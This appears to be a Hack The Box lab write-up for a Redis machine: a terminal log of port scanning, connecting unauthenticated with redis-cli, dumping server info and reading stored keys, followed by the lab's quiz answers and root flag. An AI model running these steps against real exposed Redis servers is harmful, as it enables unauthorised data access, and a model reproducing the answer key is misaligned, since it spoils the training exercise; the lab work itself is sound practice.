
```

blob:https://app.hackthebox.com/da9e33b6-5b40-44e1-851b-35f1e7f10447

┌──(kali㉿kali)-[~]
└─$ ping 10.129.87.135
PING 10.129.87.135 (10.129.87.135) 56(84) bytes of data.
64 bytes from 10.129.87.135: icmp_seq=1 ttl=63 time=186 ms
64 bytes from 10.129.87.135: icmp_seq=2 ttl=63 time=194 ms
^C
--- 10.129.87.135 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 186.421/190.236/194.052/3.815 ms
                                                                                                                  
┌──(kali㉿kali)-[~]
└─$ rustscan -a 10.129.87.135 --ulimit 5500 -b 65535 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.129.87.135:6379
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-01 12:18 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:18
Completed NSE at 12:18, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:18
Completed NSE at 12:18, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:18
Completed NSE at 12:18, 0.00s elapsed
Initiating Ping Scan at 12:18
Scanning 10.129.87.135 [2 ports]
Completed Ping Scan at 12:18, 0.21s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:18
Completed Parallel DNS resolution of 1 host. at 12:18, 0.02s elapsed
DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 12:18
Scanning 10.129.87.135 [1 port]
Discovered open port 6379/tcp on 10.129.87.135
Completed Connect Scan at 12:18, 0.18s elapsed (1 total ports)
Initiating Service scan at 12:18
Scanning 1 service on 10.129.87.135
Completed Service scan at 12:19, 6.73s elapsed (1 service on 1 host)
NSE: Script scanning 10.129.87.135.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:19
Completed NSE at 12:19, 5.02s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:19
Completed NSE at 12:19, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:19
Completed NSE at 12:19, 0.00s elapsed
Nmap scan report for 10.129.87.135
Host is up, received conn-refused (0.21s latency).
Scanned at 2022-11-01 12:18:56 EDT for 12s

PORT     STATE SERVICE REASON  VERSION
6379/tcp open  redis   syn-ack Redis key-value store 5.0.7

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:19
Completed NSE at 12:19, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:19
Completed NSE at 12:19, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:19
Completed NSE at 12:19, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.91 seconds

┌──(kali㉿kali)-[~]
└─$ redis-cli -h 10.129.87.135                            
10.129.87.135:6379> info
# Server
redis_version:5.0.7
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:66bd629f924ac924
redis_mode:standalone
os:Linux 5.4.0-77-generic x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:9.3.0
process_id:753
run_id:fbdd4806882bb2bc6bd7792f4e6ed2974f962745
tcp_port:6379
uptime_in_seconds:1151
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:6375867
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf

# Clients
connected_clients:1
client_recent_max_input_buffer:2
client_recent_max_output_buffer:0
blocked_clients:0

# Memory
used_memory:859624
used_memory_human:839.48K
used_memory_rss:5939200
used_memory_rss_human:5.66M
used_memory_peak:859624
used_memory_peak_human:839.48K
used_memory_peak_perc:100.00%
used_memory_overhead:846142
used_memory_startup:796224
used_memory_dataset:13482
used_memory_dataset_perc:21.26%
allocator_allocated:1594200
allocator_active:1937408
allocator_resident:9158656
total_system_memory:2084024320
total_system_memory_human:1.94G
used_memory_lua:41984
used_memory_lua_human:41.00K
used_memory_scripts:0
used_memory_scripts_human:0B
number_of_cached_scripts:0
maxmemory:0
maxmemory_human:0B
maxmemory_policy:noeviction
allocator_frag_ratio:1.22
allocator_frag_bytes:343208
allocator_rss_ratio:4.73
allocator_rss_bytes:7221248
rss_overhead_ratio:0.65
rss_overhead_bytes:-3219456
mem_fragmentation_ratio:7.26
mem_fragmentation_bytes:5121584
mem_not_counted_for_evict:0
mem_replication_backlog:0
mem_clients_slaves:0
mem_clients_normal:49694
mem_aof_buffer:0
mem_allocator:jemalloc-5.2.1
active_defrag_running:0
lazyfree_pending_objects:0

# Persistence
loading:0
rdb_changes_since_last_save:0
rdb_bgsave_in_progress:0
rdb_last_save_time:1667320001
rdb_last_bgsave_status:ok
rdb_last_bgsave_time_sec:0
rdb_current_bgsave_time_sec:-1
rdb_last_cow_size:421888
aof_enabled:0
aof_rewrite_in_progress:0
aof_rewrite_scheduled:0
aof_last_rewrite_time_sec:-1
aof_current_rewrite_time_sec:-1
aof_last_bgrewrite_status:ok
aof_last_write_status:ok
aof_last_cow_size:0

# Stats
total_connections_received:8
total_commands_processed:7
instantaneous_ops_per_sec:0
total_net_input_bytes:320
total_net_output_bytes:14861
instantaneous_input_kbps:0.00
instantaneous_output_kbps:0.00
rejected_connections:0
sync_full:0
sync_partial_ok:0
sync_partial_err:0
expired_keys:0
expired_stale_perc:0.00
expired_time_cap_reached_count:0
evicted_keys:0
keyspace_hits:0
keyspace_misses:0
pubsub_channels:0
pubsub_patterns:0
latest_fork_usec:714
migrate_cached_sockets:0
slave_expires_tracked_keys:0
active_defrag_hits:0
active_defrag_misses:0
active_defrag_key_hits:0
active_defrag_key_misses:0

# Replication
role:master
connected_slaves:0
master_replid:71ea7aea4f1c9776472f7da8c80a2ab510110fdb
master_replid2:0000000000000000000000000000000000000000
master_repl_offset:0
second_repl_offset:-1
repl_backlog_active:0
repl_backlog_size:1048576
repl_backlog_first_byte_offset:0
repl_backlog_histlen:0

# CPU
used_cpu_sys:1.044718
used_cpu_user:1.261464
used_cpu_sys_children:0.000000
used_cpu_user_children:0.002922

# Cluster
cluster_enabled:0

# Keyspace
db0:keys=4,expires=0,avg_ttl=0
10.129.87.135:6379> select 0
OK
10.129.87.135:6379> keys *
1) "temp"
2) "stor"
3) "flag"
4) "numb"
(0.50s)
10.129.87.135:6379> get temp
"1c98492cd337252698d0c5f631dfb7ae"
10.129.87.135:6379> get stor
"e80d635f95686148284526e1980740f8"
(1.31s)
10.129.87.135:6379> get flag
"03e1d2b376c37ab3f5319922053953eb"
(0.52s)
10.129.87.135:6379> get numb
"bb2c8a7506ee45cc981eb88bb81dddab"
10.129.87.135:6379> exit

pwnd

```

Which TCP port is open on the machine? 
*6379*

Which service is running on the port that is open on the machine? 
*redis*

What type of database is Redis? Choose from the following options: (i) In-memory Database, (ii) Traditional Database 
Redis es un motor de base de datos en memoria, basado en el almacenamiento en tablas de hashes pero que opcionalmente puede ser usada como una base de datos durable o persistente. Está escrito en ANSI C por Salvatore Sanfilippo, quien es patrocinado por Redis Labs. 
*In-memory Database*

Which command-line utility is used to interact with the Redis server? Enter the program name you would enter into the terminal without any arguments. 
*redis-cli*

Which flag is used with the Redis command-line utility to specify the hostname? 
*-h*

Once connected to a Redis server, which command is used to obtain the information and statistics about the Redis server? 
*info*

What is the version of the Redis server being used on the target machine? 
*5.0.7*

Which command is used to select the desired database in Redis? 
*select*

How many keys are present inside the database with index 0? 
*4*

Which command is used to obtain all the keys in a database? 
*keys * *

Submit root flag 
*03e1d2b376c37ab3f5319922053953eb*



[[Dancing]]